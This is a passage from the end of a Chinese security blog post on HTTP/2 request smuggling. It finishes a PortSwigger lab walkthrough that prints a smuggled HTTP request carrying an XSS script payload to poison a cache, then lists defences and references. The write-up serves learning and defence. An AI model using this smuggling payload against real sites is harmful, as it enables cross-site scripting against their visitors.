+<p><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/image-20221119221022669.png" alt="image-20221119221022669"></p>
+<p>响应正文中包含了：<code>HTTP/1.1 200 OK</code>，说明我们的走私成功。</p>
+<p>接下来构造恶意请求，我<em><strong>们需要找到一个解析直接反映基于HTML的XSS的路径</strong></em>。打开HackBar，发现<code>/resources</code>下面有js文件，那应该就不会错了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/?cachebuster=3 HTTP/1.1</span><br><span class="line">Host: 0ad000e504d316fac03031f100c000a3.web-security-academy.net</span><br><span class="line"></span><br><span class="line">GET /resources?&lt;script&gt;alert(1)&lt;/script&gt; HTTP/1.1</span><br><span class="line">Foo: bar</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/image-20221119222153174.png" alt="image-20221119222153174"></p>
+<p>但是还是遇到了一些问题。观察请求超时，这是因为<code>Content-Length</code>主响应中的请求头比对隧道请求的嵌套响应长。我们正常访问一下，看看<code>Length</code>有多大。嗝~差的有点多，我们在<code>&lt;/script&gt;</code>后面补上差的字符数。</p>
+<p><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/image-20221119221628025.png" alt="image-20221119221628025"></p>
+<p><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/image-20221119225144632.png" alt="image-20221119225144632"></p>
+<p>补上8353个字符就能看到成功给我们返回302，这时候我们再去访问一下<code>/?cachebuster=3</code>看看效果。</p>
+<p><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/image-20221119225306018.png" alt="image-20221119225306018"></p>
+<p>看到弹窗，结束。</p>
+<h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><ol>
+<li>避免 HTTP&#x2F;2 降级或者使用端到端的 HTTP&#x2F;2。</li>
+<li>请强制执行 HTTP&#x2F;1 中存在的字符集限制 - 拒绝在请求头中包含换行符、请求头名称中包含冒号、请求方法中包含空格等的请求。</li>
+<li>限制那些未标记的请求头。</li>
+<li>放弃继承HTTP&#x2F;1.1，它今后也许会引发各种安全问题。</li>
+</ol>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>在HTTP2中，利用方式稍微比HTTP1多了一点点。不再是<code>Content-Length</code>的和<code>Transfer-Encoding</code>之间的各种交叉。基本上HTTP2的利用都是要靠降级完成。在降级的过程中对应<code>Content-Length</code>和<code>Transfer-Encoding</code>做了一些不同的处理。同时，基于HTTP2二进制传输，对于<code>\r\n\r\n</code>解析也与HTTP1不同，这使得我们进行请求的各种拆分去绕过简单的过滤。再然后，根据请求隧道方式的差异性，针对HTTP2隧道也能进行一定程度上的攻击。</p>
+<p>目前HTTP2的利用工具，我觉得burpsuite自带插件就比较好用。毕竟<code>James Kettle</code>是burp家的技术总监。关于<code>HTTP request smuggler</code>工具的介绍这里我就不做介绍了，整体的一个逻辑应该不是很难理解。</p>
+<p>关于H2c走私，因为已经有很多师傅都已经写过<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/220996">文章</a>了，也不再说明了。</p>
+<p>本文如果存在逻辑问题，还请各位师傅批评指正~</p>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a target="_blank" rel="noopener" href="https://portswigger.net/research/http2">https://portswigger.net/research/http2</a></p>
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/advanced">https://portswigger.net/web-security/request-smuggling/advanced</a></p>
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/advanced/request-tunnelling">https://portswigger.net/web-security/request-smuggling/advanced/request-tunnelling</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://yake-daigua.top">yake-daigua</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://yake-daigua.top/2022/11/25/HTTP2%20request%20smuggling/">https://yake-daigua.top/2022/11/25/HTTP2%20request%20smuggling/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://yake-daigua.top" target="_blank">yake-daigua</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/HTTP-Request-Smuggling/">HTTP Request Smuggling</a></div><div class="post_share"><div class="social-share" data-image="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/221125121515.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2022/11/16/HTTP%E8%B5%B0%E7%A7%81%E9%9D%B6%E5%9C%BA/"><img class="next-cover" src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/6d280d2dfe7be6116b88c3b564148f2.jpg" onerror="onerror=null;src='https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/mypic3(1).jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">HTTP走私靶场</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2022/11/16/HTTP%E8%B5%B0%E7%A7%81%E9%9D%B6%E5%9C%BA/" title="HTTP走私靶场"><img class="cover" src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/6d280d2dfe7be6116b88c3b564148f2.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-16</div><div class="title">HTTP走私靶场</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/微信图片_20220920163546.jpg" onerror="this.onerror=null;this.src='https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/mypic3(1).jpg'" alt="avatar"/></div><div class="author-info__name">yake-daigua</div><div class="author-info__description">爱蜜莉雅,我好喜欢你</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">10</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/yake-daigua"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到yake-daigua的Blog，不定期更新技术总结文章和个人阶段性学习成果。加油啊，敲键盘的大哥哥。<img src="/img/loading.gif" data-original="https://npm.arcitcgn.cn/aciano-cdn@1.0.10/Yay.gif"></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HTTP-x2F-2"><span class="toc-number">2.</span> <span class="toc-text">HTTP&#x2F;2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%BC%A0%E8%BE%93"><span class="toc-number">2.0.1.</span> <span class="toc-text">二进制传输</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Header%E5%8E%8B%E7%BC%A9"><span class="toc-number">2.0.2.</span> <span class="toc-text">Header压缩</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B6%88%E6%81%AF%E9%95%BF%E5%BA%A6"><span class="toc-number">2.0.3.</span> <span class="toc-text">消息长度</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HTTP-x2F-2%E9%99%8D%E7%BA%A7"><span class="toc-number">3.</span> <span class="toc-text">HTTP&#x2F;2降级</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#H2-CL"><span class="toc-number">4.</span> <span class="toc-text">H2.CL</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A1%88%E4%BE%8B"><span class="toc-number">4.0.1.</span> <span class="toc-text">案例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2021-21295"><span class="toc-number">4.0.2.</span> <span class="toc-text">CVE-2021-21295</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95"><span class="toc-number">4.0.3.</span> <span class="toc-text">防御方法</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#H2-TE"><span class="toc-number">5.</span> <span class="toc-text">H2.TE</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%93%8D%E5%BA%94%E9%98%9F%E5%88%97%E4%B8%AD%E6%AF%92"><span class="toc-number">6.</span> <span class="toc-text">响应队列中毒</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A1%88%E4%BE%8B-1"><span class="toc-number">6.0.1.</span> <span class="toc-text">案例</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CRLF%E6%8B%86%E5%88%86"><span class="toc-number">7.</span> <span class="toc-text">CRLF拆分</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A1%88%E4%BE%8B-2"><span class="toc-number">7.0.1.</span> <span class="toc-text">案例</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HTTP2%E8%AF%B7%E6%B1%82%E6%8B%86%E5%88%86"><span class="toc-number">8.</span> <span class="toc-text">HTTP2请求拆分</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%B7%E6%B1%82%E5%A4%B4%E5%86%85%E5%AE%B9%E6%8B%86%E5%88%86"><span class="toc-number">8.0.1.</span> <span class="toc-text">请求头内容拆分</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#H2-TE%E8%AF%B7%E6%B1%82%E5%A4%B4%E6%8B%86%E5%88%86"><span class="toc-number">8.0.2.</span> <span class="toc-text">H2.TE请求头拆分</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#H2-TE%E8%AF%B7%E6%B1%82%E9%A6%96%E8%A1%8C%E6%8B%86%E5%88%86"><span class="toc-number">8.0.3.</span> <span class="toc-text">H2.TE请求首行拆分</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A1%88%E4%BE%8B-3"><span class="toc-number">8.0.4.</span> <span class="toc-text">案例</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HTTP%E8%AF%B7%E6%B1%82%E9%9A%A7%E9%81%93"><span class="toc-number">9.</span> <span class="toc-text">HTTP请求隧道</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9A%A7%E9%81%93%E7%A1%AE%E8%AE%A4"><span class="toc-number">9.0.1.</span> <span class="toc-text">隧道确认</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%B7%E6%B1%82%E5%A4%B4%E6%B3%84%E9%9C%B2"><span class="toc-number">9.0.2.</span> <span class="toc-text">请求头泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A1%88%E4%BE%8B-4"><span class="toc-number">9.0.3.</span> <span class="toc-text">案例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92"><span class="toc-number">9.0.4.</span> <span class="toc-text">缓存投毒</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A1%88%E4%BE%8B-5"><span class="toc-number">9.0.5.</span> <span class="toc-text">案例</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1"><span class="toc-number">10.</span> <span class="toc-text">防御</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">11.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">12.</span> <span class="toc-text">参考链接</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/11/25/HTTP2%20request%20smuggling/" title="HTTP2 request smuggling"><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/221125121515.jpg" onerror="this.onerror=null;this.src='https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/mypic3(1).jpg'" alt="HTTP2 request smuggling"/></a><div class="content"><a class="title" href="/2022/11/25/HTTP2%20request%20smuggling/" title="HTTP2 request smuggling">HTTP2 request smuggling</a><time datetime="2022-11-25T04:12:08.000Z" title="发表于 2022-11-25 12:12:08">2022-11-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/11/16/HTTP%E8%B5%B0%E7%A7%81%E9%9D%B6%E5%9C%BA/" title="HTTP走私靶场"><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/6d280d2dfe7be6116b88c3b564148f2.jpg" onerror="this.onerror=null;this.src='https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/mypic3(1).jpg'" alt="HTTP走私靶场"/></a><div class="content"><a class="title" href="/2022/11/16/HTTP%E8%B5%B0%E7%A7%81%E9%9D%B6%E5%9C%BA/" title="HTTP走私靶场">HTTP走私靶场</a><time datetime="2022-11-16T14:33:49.000Z" title="发表于 2022-11-16 22:33:49">2022-11-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/11/11/SQLI/" title="SQL注入"><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/5b7adf6e714ea6c53e24ed50477cbab.jpg" onerror="this.onerror=null;this.src='https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/mypic3(1).jpg'" alt="SQL注入"/></a><div class="content"><a class="title" href="/2022/11/11/SQLI/" title="SQL注入">SQL注入</a><time datetime="2022-11-11T08:20:21.000Z" title="发表于 2022-11-11 16:20:21">2022-11-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/11/02/%E6%B5%85%E6%9E%90NodeJS/" title="浅析NodeJS"><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/2193933.jpg" onerror="this.onerror=null;this.src='https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/mypic3(1).jpg'" alt="浅析NodeJS"/></a><div class="content"><a class="title" href="/2022/11/02/%E6%B5%85%E6%9E%90NodeJS/" title="浅析NodeJS">浅析NodeJS</a><time datetime="2022-11-02T11:35:18.000Z" title="发表于 2022-11-02 19:35:18">2022-11-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/10/31/2022%E5%B9%B410%E6%9C%88%E6%80%BB%E7%BB%93/" title="2022年10月总结"><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/445.jpg" onerror="this.onerror=null;this.src='https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/mypic3(1).jpg'" alt="2022年10月总结"/></a><div class="content"><a class="title" href="/2022/10/31/2022%E5%B9%B410%E6%9C%88%E6%80%BB%E7%BB%93/" title="2022年10月总结">2022年10月总结</a><time datetime="2022-10-31T15:42:30.000Z" title="发表于 2022-10-31 23:42:30">2022-10-31</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2022 By yake-daigua</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">愿你有一天能和你重要的人早日相遇</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'TieUOuIwaBZb4edJcJ1C02ka-gzGzoHsz',
+      appKey: 'eJRGo87LLpxMlIWKemPvjBtH',
+      avatar: 'monsterid',
+      serverURLs: 'https://tieuouiw.lc-cn-n1-shared.com',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !true) {
+  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script><script>function loadDisqus () {
+  var disqus_config = function () {
+    this.page.url = 'https://yake-daigua.top/2022/11/25/HTTP2%20request%20smuggling/'
+    this.page.identifier = '/2022/11/25/HTTP2%20request%20smuggling/'
+    this.page.title = 'HTTP2 request smuggling'
+  };
+
+  window.disqusReset = () => {
+    DISQUS.reset({
+      reload: true,
+      config: disqus_config
+    })
+  }
+
+  if (window.DISQUS) disqusReset()
+  else {
+    (function() { 
+      var d = document, s = d.createElement('script');
+      s.src = 'https://.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  }
+
+  document.getElementById('darkmode').addEventListener('click', () => {
+    setTimeout(() => window.disqusReset(), 200)
+  })
+}
+
+if ('Valine' === 'Disqus' || !true) {
+  if (true) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
+  else loadDisqus()
+} else {
+  function loadOtherComment () {
+    loadDisqus()
+  }
+}
+</script></div><script src="https://cdn.jsdelivr.net/gh/lete114/CDN/js/upjiang.js"></script><script type="text/javascript" src="/js/fairyDustCursor.js"></script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="false"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div>
+        <style>
+            [bg-lazy] {
+                background-image: none !important;
+                background-color: #eee !important;
+            }
+        </style>
+        <script>
+            window.imageLazyLoadSetting = {
+                isSPA: false,
+                preloadRatio: 1,
+                processImages: null,
+            };
+        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(e){e.imageLazyLoadSetting.processImages=t;var n=e.imageLazyLoadSetting.isSPA,i=e.imageLazyLoadSetting.preloadRatio||1,r=o();function o(){var t=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")),e=Array.prototype.slice.call(document.querySelectorAll("[bg-lazy]"));return t.concat(e)}function t(){n&&(r=o());for(var t,a=0;a<r.length;a++)0<=(t=(t=r[a]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(e.innerHeight*i||document.documentElement.clientHeight*i)&&function(){var t,e,n,i,o=r[a];e=function(){r=r.filter(function(t){return o!==t})},(t=o).hasAttribute("bg-lazy")?(t.removeAttribute("bg-lazy"),e&&e()):(n=new Image,i=t.getAttribute("data-original"),n.onload=function(){t.src=i,t.removeAttribute("data-original"),e&&e()},t.src!==i&&(n.src=i))}()}function a(){clearTimeout(t.tId),t.tId=setTimeout(t,500)}t(),document.addEventListener("scroll",a),e.addEventListener("resize",a),e.addEventListener("orientationchange",a)}(this);</script></body></html>
